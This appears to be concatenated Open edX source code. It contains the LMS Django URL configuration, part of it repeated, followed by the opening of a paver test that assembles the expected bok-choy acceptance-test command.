            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

"""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
"""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """
    Paver Bok Choy Command test cases
    """

    def _expected_command(self, name, store=None, verify_xss=False):                    
        """
        Returns the command that is expected to be run for the given test spec
        and store.
        """

        expected_statement = (
            "DEFAULT_STORE={default_store} "
            "SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' "
            "BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' "
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' "
            "SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' "
            "VERIFY_XSS='{verify_xss}' "
            "nosetests {repo_dir}/common/test/acceptance/{exp_text} "
            "--with-xunit "
            "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml "
            "--verbosity=2 "
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

